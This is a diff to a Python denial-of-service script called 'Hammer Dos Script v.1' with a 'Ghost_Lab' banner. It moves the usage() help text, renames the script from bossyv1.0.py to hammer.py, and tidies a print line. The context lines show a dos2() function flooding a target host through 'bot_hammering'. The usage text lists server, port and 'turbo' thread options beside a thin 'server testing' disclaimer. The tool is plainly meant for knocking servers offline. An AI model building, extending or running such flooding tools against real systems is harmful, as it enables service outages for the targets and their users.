@@ -15,7 +15,7 @@ import time
 import sys
 
 print(" ")
-print(" Program Opened ")
+print("Program Opened")
 with tqdm(total = 100) as progressbar:
 	for i in range(10):
 		sleep(0.1)
@@ -156,7 +156,18 @@ def dos2():
 		bot_hammering(random.choice(bots)+"http://"+host)
 		w.task_done()
 		
+def usage():
+	print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
+	It is the end user's responsibility to obey all applicable laws.
+	It is just for server testing script. Your ip is visible. \n
+	usage : python3 hammer.py [-s] [-p] [-t]
+	-h : help
+	-s : server ip
+	-p : port default 80
+	-t : turbo default 135 \033[0m''')
+	sys.exit()
 
+				
 class Ghost_Lab:
     Banner = """
    ***
@@ -193,17 +204,7 @@ print(colors.GR + Ghost_Lab.Fast_Ban)
 print(Ghost_Lab.End_Status)
 time.sleep(2)
 
-def usage():
-		print (''' \033[92m	Hammer Dos Script v.1 http://www.canyalcin.com/
-	It is the end user's responsibility to obey all applicable laws.
-	It is just for server testing script. Your ip is visible. \n
-	usage : python3 bossyv1.0.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
-	sys.exit()
-	
+
 def get_parameters():
 	global host
 	global port
